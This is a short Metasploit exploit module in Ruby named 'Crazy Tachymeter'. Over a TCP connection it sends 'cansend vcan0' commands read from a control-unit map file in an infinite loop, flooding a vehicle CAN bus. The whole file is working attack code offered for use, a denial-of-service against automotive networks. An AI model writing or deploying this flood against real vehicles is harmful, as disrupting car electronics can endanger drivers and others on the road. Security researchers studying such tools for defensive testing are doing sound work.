##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Crazy Tachymeter',
      'Description'    => %q{
        With this tool you can flood the CAN-Bus.
        Just pass a file.txt with the control unit map.
      },
      'Author'         => ['Pietro Biondi'],
      'DisclosureDate' => 'May 18 2018',
      'License'        => MSF_LICENSE,
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Payload'        =>
      {
        'Space'       => 1024,
        'DisableNops' => true,
        'Compat'      =>
        {
          'PayloadType' => 'cmd',
          'RequiredCmd' => 'generic ruby telnet'
        }
      },
      'Targets'        =>
      [
        ['Automatic Target', {}]
      ],
      'DefaultTarget' => 0
      )
    )

    register_options([
      Opt::RPORT(4444),
      OptString.new('FILEMAP', [true, 'Path to FILEMAP', '/usr/share/metasploit-framework/data/wordlists/controlUnitMapCanBus.txt'])
    ])
  end

  def exploit
    connect
    print_status("Connected to #{rhost}:#{rport}...")
    print_status(' -- OPENING CONTROL UNIT MAP --')
    lines = []
    f = File.open(datastore['FILEMAP'], "rb")
    f.each_line do |line|
      lines.push(line)
    end
    f.close
    print_status(' -- Flooding -- ')
    while 1
      lines.each_with_index{
        |e, i|
        cmd = 'cansend vcan0 ' + "#{e}"
        sock.put(cmd)
      }
    end
  end
end
